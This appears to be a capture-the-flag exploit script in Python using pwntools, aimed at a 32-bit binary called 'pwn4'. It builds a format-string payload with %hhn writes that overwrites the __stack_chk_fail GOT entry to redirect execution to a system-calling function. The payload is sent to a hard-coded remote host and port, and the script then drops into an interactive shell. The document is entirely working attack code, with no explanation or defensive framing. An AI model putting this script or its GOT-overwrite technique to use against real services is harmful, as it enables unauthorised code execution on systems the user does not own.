#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./pwn4')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elif debug == 0:
    p = remote('117.139.247.14', 9217)
    # libc = ELF('./', checksec=False)
elf = ELF('./pwn4', checksec=False)
#gdb.attach(p, "b *0x0804857E\nc\nsi")
#gdb.attach(p, "b *0x080485A6\nc")
got___stack_chk_fail = elf.got['__stack_chk_fail']
addr_fun_sys = 0x080484FB

pd = 'aa'  # 4 num = 2
pd += p32(got___stack_chk_fail + 0)  # 5 num = 6
pd += p32(got___stack_chk_fail + 1)  # 6 num = 10
pd += '%' + str(0xfb - 10) + 'd%5$hhn' # num = 19
pd += '%' + str(0x89) + 'd%6$hhn'
print pd
success('got___stack_chk_fail = ' + hex(got___stack_chk_fail))
p.send(pd)
p.interactive()
